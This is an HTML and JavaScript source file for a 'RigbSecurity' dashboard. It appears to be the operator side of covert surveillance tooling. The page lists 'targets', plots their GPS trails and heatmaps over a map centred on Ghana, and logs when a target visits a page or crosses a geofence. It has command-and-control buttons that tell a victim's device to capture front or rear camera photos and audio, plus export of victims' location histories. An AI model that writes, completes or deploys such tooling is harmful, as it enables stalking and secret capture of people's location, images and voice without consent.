<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RigbSecurity — Dashboard v3</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0a0a0f; color: #e0e0e0; }

/* LOGIN */
#login-overlay {
  position: fixed; inset: 0; background: #0a0a0f; z-index: 9999;
  display: flex; align-items: center; justify-content: center;
}
#login-box {
  background: #1a1a2e; padding: 40px; border-radius: 12px; border: 1px solid #333;
  text-align: center; min-width: 320px;
}
#login-box h2 { color: #00ff88; margin-bottom: 20px; }
#login-box input {
  width: 100%; padding: 12px; background: #0a0a0f; border: 1px solid #444;
  color: #fff; border-radius: 6px; font-size: 16px; margin-bottom: 12px;
}
#login-box button {
  width: 100%; padding: 12px; background: #00ff88; color: #000; border: none;
  border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer;
}
#login-box button:hover { background: #00cc6a; }
#login-error { color: #ff4444; margin-top: 10px; display: none; }

/* LAYOUT */
.hidden { display: none !important; }
#app { display: grid; grid-template-columns: 320px 1fr; height: 100vh; }
#sidebar {
  background: #111; border-right: 1px solid #222; overflow-y: auto; padding: 16px;
}
#main { display: flex; flex-direction: column; }
#map { flex: 1; }
#bottom-panel {
  height: 200px; background: #111; border-top: 1px solid #222;
  overflow-y: auto; padding: 12px;
}

/* SIDEBAR */
.sidebar-header {
  display: flex; align-items: center; justify-content: space-between;
  margin-bottom: 16px;
}
.sidebar-header h3 { color: #00ff88; font-size: 14px; }
#search-input {
  width: 100%; padding: 8px 12px; background: #1a1a2e; border: 1px solid #333;
  color: #fff; border-radius: 6px; margin-bottom: 12px; font-size: 13px;
}
.target-card {
  background: #1a1a2e; border: 1px solid #333; border-radius: 8px;
  padding: 12px; margin-bottom: 8px; cursor: pointer; transition: border-color 0.2s;
}
.target-card:hover, .target-card.active { border-color: #00ff88; }
.target-name { font-weight: bold; color: #fff; font-size: 14px; }
.target-meta { font-size: 11px; color: #888; margin-top: 4px; }
.target-badge {
  display: inline-block; font-size: 10px; padding: 2px 6px; border-radius: 4px;
  background: #333; color: #aaa; margin-top: 4px;
}
.target-badge.online { background: #003d1a; color: #00ff88; }

/* C2 BUTTONS */
.c2-bar {
  display: flex; gap: 4px; margin-top: 8px; flex-wrap: wrap;
}
.c2-btn {
  padding: 4px 8px; font-size: 10px; border: 1px solid #444; background: #222;
  color: #ccc; border-radius: 4px; cursor: pointer;
}
.c2-btn:hover { background: #333; border-color: #00ff88; color: #00ff88; }

/* BOTTOM PANEL */
#event-log { font-family: monospace; font-size: 12px; }
.log-entry { padding: 2px 0; border-bottom: 1px solid #1a1a1a; }
.log-gps { color: #00ff88; }
.log-media { color: #ff88ff; }
.log-c2 { color: #ffaa00; }
.log-geofence { color: #ff4444; }

/* EXPORT BAR */
#export-bar {
  display: flex; gap: 8px; padding: 8px 16px; background: #0d0d14; border-bottom: 1px solid #222;
}
.export-btn {
  padding: 6px 12px; font-size: 12px; border: 1px solid #333; background: #1a1a2e;
  color: #ccc; border-radius: 4px; cursor: pointer;
}
.export-btn:hover { border-color: #00ff88; color: #00ff88; }

/* STATS */
#stats-bar {
  display: flex; gap: 16px; padding: 8px 16px; background: #0d0d14;
  border-bottom: 1px solid #222; font-size: 12px; color: #888;
}
.stat-item span { color: #00ff88; font-weight: bold; }
</style>
</head>
<body>

<!-- LOGIN OVERLAY -->
<div id="login-overlay">
  <div id="login-box">
    <h2>🔒 RigbSecurity</h2>
    <input type="password" id="login-pw" placeholder="Dashboard Password" autofocus>
    <button onclick="doLogin()">Authenticate</button>
    <div id="login-error">Invalid password</div>
  </div>
</div>

<!-- MAIN APP -->
<div id="app" class="hidden">
  <div id="sidebar">
    <div class="sidebar-header">
      <h3>🎯 TARGETS</h3>
      <span id="target-count" style="color:#888;font-size:12px;">0</span>
    </div>
    <input type="text" id="search-input" placeholder="Search targets...">
    <div id="target-list"></div>
  </div>
  <div id="main">
    <div id="stats-bar">
      <div class="stat-item">Targets: <span id="stat-targets">0</span></div>
      <div class="stat-item">GPS Fixes: <span id="stat-gps">0</span></div>
      <div class="stat-item">Photos: <span id="stat-photos">0</span></div>
      <div class="stat-item">Audio: <span id="stat-audio">0</span></div>
    </div>
    <div id="export-bar">
      <button class="export-btn" onclick="exportJSON()">📥 Export JSON</button>
      <button class="export-btn" onclick="exportKML()">🗺️ Export KML</button>
      <button class="export-btn" onclick="toggleHeatmap()">🔥 Heatmap</button>
    </div>
    <div id="map"></div>
    <div id="bottom-panel">
      <div id="event-log"></div>
    </div>
  </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script src="https://unpkg.com/leaflet.heat@0.2.0/dist/leaflet-heat.js"></script>
<script>
// ═══════════════════════════════════════════
// AUTH
// ═══════════════════════════════════════════
let authToken = localStorage.getItem('rigb_token') || '';

async function doLogin() {
  const pw = document.getElementById('login-pw').value;
  try {
    const resp = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password: pw })
    });
    const data = await resp.json();
    if (resp.ok && data.token) {
      authToken = data.token;
      localStorage.setItem('rigb_token', authToken);
      document.getElementById('login-overlay').classList.add('hidden');
      document.getElementById('app').classList.remove('hidden');
      initDashboard();
    } else {
      document.getElementById('login-error').style.display = 'block';
    }
  } catch (e) {
    document.getElementById('login-error').style.display = 'block';
  }
}

document.getElementById('login-pw').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') doLogin();
});

// Auto-login if token cached
if (authToken) {
  fetch('/api/all-targets', { headers: { 'X-Auth-Token': authToken } })
    .then(r => { if (r.ok) return r.json(); throw new Error(); })
    .then(() => {
      document.getElementById('login-overlay').classList.add('hidden');
      document.getElementById('app').classList.remove('hidden');
      initDashboard();
    })
    .catch(() => { localStorage.removeItem('rigb_token'); authToken = ''; });
}

// ═══════════════════════════════════════════
// DASHBOARD STATE
// ═══════════════════════════════════════════
let map, markers = {}, polylines = {}, heatLayer = null;
let allTargets = {};
let selectedTid = null;
let ws = null;
let heatmapVisible = false;

function initDashboard() {
  initMap();
  loadTargets();
  connectWebSocket();
  document.getElementById('search-input').addEventListener('input', renderTargetList);
}

function initMap() {
  map = L.map('map').setView([7.9465, -1.0232], 7); // Ghana center
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '© OpenStreetMap'
  }).addTo(map);
}

async function loadTargets() {
  try {
    const resp = await fetch('/api/all-targets', { headers: { 'X-Auth-Token': authToken } });
    allTargets = await resp.json();
    renderTargetList();
    updateStats();
    plotAllTargets();
  } catch (e) {}
}

// ═══════════════════════════════════════════
// RENDER (XSS-SAFE)
// ═══════════════════════════════════════════
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str || '';
  return div.innerHTML;
}

function renderTargetList() {
  const search = document.getElementById('search-input').value.toLowerCase();
  const list = document.getElementById('target-list');
  list.innerHTML = '';

  const tids = Object.keys(allTargets).filter(tid => {
    const t = allTargets[tid].tracking || {};
    const name = (t.name || tid).toLowerCase();
    return name.includes(search) || tid.includes(search);
  });

  document.getElementById('target-count').textContent = tids.length;

  tids.forEach(tid => {
    const t = allTargets[tid].tracking || {};
    const locs = allTargets[tid].locations || [];
    const media = allTargets[tid].media || [];
    const lastLoc = locs[locs.length - 1];

    const card = document.createElement('div');
    card.className = 'target-card' + (tid === selectedTid ? ' active' : '');
    card.onclick = () => selectTarget(tid);

    card.innerHTML = `
      <div class="target-name">${escapeHtml(t.name || tid)}</div>
      <div class="target-meta">ID: ${escapeHtml(tid)} | Visits: ${t.visits || 0}</div>
      <div class="target-meta">${locs.length} GPS | ${media.length} Media</div>
      ${lastLoc ? `<div class="target-meta">Last: ${escapeHtml(lastLoc.ts || '')}</div>` : ''}
      <span class="target-badge ${locs.length > 0 ? 'online' : ''}">${locs.length > 0 ? 'ACTIVE' : 'PENDING'}</span>
      <div class="c2-bar">
        <button class="c2-btn" onclick="event.stopPropagation();sendC2('${tid}','getGPS')">📍 GPS</button>
        <button class="c2-btn" onclick="event.stopPropagation();sendC2('${tid}','getPhoto')">📸 Photo</button>
        <button class="c2-btn" onclick="event.stopPropagation();sendC2('${tid}','getRearPhoto')">📷 Rear</button>
        <button class="c2-btn" onclick="event.stopPropagation();sendC2('${tid}','getAudio')">🎙️ Audio</button>
        <button class="c2-btn" onclick="event.stopPropagation();sendC2('${tid}','getLongAudio')">🎙️ 30s</button>
        <button class="c2-btn" onclick="event.stopPropagation();deleteTarget('${tid}')">🗑️</button>
      </div>
    `;
    list.appendChild(card);
  });
}

function selectTarget(tid) {
  selectedTid = tid;
  renderTargetList();
  const locs = allTargets[tid]?.locations || [];
  if (locs.length > 0) {
    const last = locs[locs.length - 1];
    map.setView([last.lat, last.lon], 15);
  }
}

// ═══════════════════════════════════════════
// MAP PLOTTING
// ═══════════════════════════════════════════
function plotAllTargets() {
  Object.keys(allTargets).forEach(tid => {
    const locs = allTargets[tid].locations || [];
    if (locs.length === 0) return;

    const last = locs[locs.length - 1];

    // Marker
    if (markers[tid]) map.removeLayer(markers[tid]);
    const name = escapeHtml(allTargets[tid].tracking?.name || tid);
    markers[tid] = L.marker([last.lat, last.lon])
      .addTo(map)
      .bindPopup(`<b>${name}</b><br>Acc: ${last.acc}m<br>${last.ts}`);

    // Polyline
    if (polylines[tid]) map.removeLayer(polylines[tid]);
    const coords = locs.filter(l => l.lat && l.lon).map(l => [l.lat, l.lon]);
    if (coords.length > 1) {
      polylines[tid] = L.polyline(coords, { color: '#00ff88', weight: 2, opacity: 0.7 }).addTo(map);
    }
  });

  // Fit bounds
  const allCoords = [];
  Object.values(allTargets).forEach(t => {
    (t.locations || []).forEach(l => { if (l.lat && l.lon) allCoords.push([l.lat, l.lon]); });
  });
  if (allCoords.length > 0) {
    map.fitBounds(allCoords);
  }
}

// ═══════════════════════════════════════════
// HEATMAP
// ═══════════════════════════════════════════
function toggleHeatmap() {
  if (heatmapVisible && heatLayer) {
    map.removeLayer(heatLayer);
    heatLayer = null;
    heatmapVisible = false;
    return;
  }

  const points = [];
  Object.values(allTargets).forEach(t => {
    (t.locations || []).forEach(l => {
      if (l.lat && l.lon) points.push([l.lat, l.lon, 0.5]);
    });
  });

  if (points.length > 0) {
    heatLayer = L.heatLayer(points, { radius: 25, blur: 15, maxZoom: 17 }).addTo(map);
    heatmapVisible = true;
  }
}

// ═══════════════════════════════════════════
// C2 COMMANDS
// ═══════════════════════════════════════════
async function sendC2(tid, cmd) {
  try {
    await fetch(`/api/command/${tid}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Auth-Token': authToken },
      body: JSON.stringify({ command: cmd })
    });
    addLog(`[C2] Sent "${cmd}" to ${tid}`, 'c2');
  } catch (e) {
    addLog(`[C2] Failed to send "${cmd}"`, 'c2');
  }
}

async function deleteTarget(tid) {
  if (!confirm(`Delete target ${tid} and all data?`)) return;
  try {
    await fetch(`/api/delete/${tid}`, {
      method: 'DELETE',
      headers: { 'X-Auth-Token': authToken }
    });
    delete allTargets[tid];
    if (markers[tid]) { map.removeLayer(markers[tid]); delete markers[tid]; }
    if (polylines[tid]) { map.removeLayer(polylines[tid]); delete polylines[tid]; }
    renderTargetList();
    updateStats();
  } catch (e) {}
}

// ═══════════════════════════════════════════
// EXPORT
// ═══════════════════════════════════════════
function exportJSON() {
  const tid = selectedTid;
  if (!tid) { alert('Select a target first'); return; }
  window.open(`/api/export/${tid}?token=${authToken}`, '_blank');
}

function exportKML() {
  const tid = selectedTid;
  if (!tid) { alert('Select a target first'); return; }
  window.open(`/api/export/${tid}/kml?token=${authToken}`, '_blank');
}

// ═══════════════════════════════════════════
// WEBSOCKET REAL-TIME
// ═══════════════════════════════════════════
function connectWebSocket() {
  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
  ws = new WebSocket(`${proto}//${location.host}/ws/dashboard`);

  ws.onmessage = (e) => {
    try {
      const data = JSON.parse(e.data);
      handleEvent(data);
    } catch (err) {}
  };

  ws.onclose = () => {
    setTimeout(connectWebSocket, 3000);
  };
}

function handleEvent(data) {
  const tid = data.tid;

  if (data.type === 'gps') {
    if (!allTargets[tid]) allTargets[tid] = { tracking: { name: tid }, locations: [], media: [] };
    allTargets[tid].locations.push(data.entry);
    plotAllTargets();
    renderTargetList();
    updateStats();
    addLog(`📍 [${escapeHtml(allTargets[tid].tracking?.name || tid)}] ${data.entry.lat}, ${data.entry.lon} (${data.entry.acc}m)`, 'gps');
  }

  if (data.type === 'media') {
    if (!allTargets[tid]) allTargets[tid] = { tracking: { name: tid }, locations: [], media: [] };
    allTargets[tid].media.push(data.entry);
    renderTargetList();
    updateStats();
    addLog(`📸 [${escapeHtml(allTargets[tid].tracking?.name || tid)}] ${data.entry.type} (${data.entry.camera || ''})`, 'media');
  }

  if (data.type === 'visit') {
    addLog(`👁️ [${tid}] Target visited page`, 'gps');
    loadTargets();
  }

  if (data.type === 'geofence') {
    const emoji = data.alert.type === 'enter' ? '🚨' : '🏃';
    addLog(`${emoji} [${tid}] Geofence ${data.alert.type}: ${escapeHtml(data.alert.name)}`, 'geofence');
  }

  if (data.type === 'device') {
    if (allTargets[tid]) allTargets[tid].device = data.data;
  }

  if (data.type === 'c2') {
    addLog(`⚡ [${tid}] C2: ${data.cmd} — ${data.status}`, 'c2');
  }
}

// ═══════════════════════════════════════════
// EVENT LOG
// ═══════════════════════════════════════════
function addLog(msg, type = 'gps') {
  const log = document.getElementById('event-log');
  const entry = document.createElement('div');
  entry.className = `log-entry log-${type}`;
  const ts = new Date().toLocaleTimeString();
  entry.textContent = `[${ts}] ${msg}`;
  log.insertBefore(entry, log.firstChild);
  // Keep max 200 entries
  while (log.children.length > 200) log.removeChild(log.lastChild);
}

// ═══════════════════════════════════════════
// STATS
// ═══════════════════════════════════════════
function updateStats() {
  let totalGps = 0, totalPhotos = 0, totalAudio = 0;
  Object.values(allTargets).forEach(t => {
    totalGps += (t.locations || []).length;
    (t.media || []).forEach(m => {
      if (m.type === 'photo') totalPhotos++;
      if (m.type === 'audio') totalAudio++;
    });
  });
  document.getElementById('stat-targets').textContent = Object.keys(allTargets).length;
  document.getElementById('stat-gps').textContent = totalGps;
  document.getElementById('stat-photos').textContent = totalPhotos;
  document.getElementById('stat-audio').textContent = totalAudio;
}
</script>
</body>
</html>
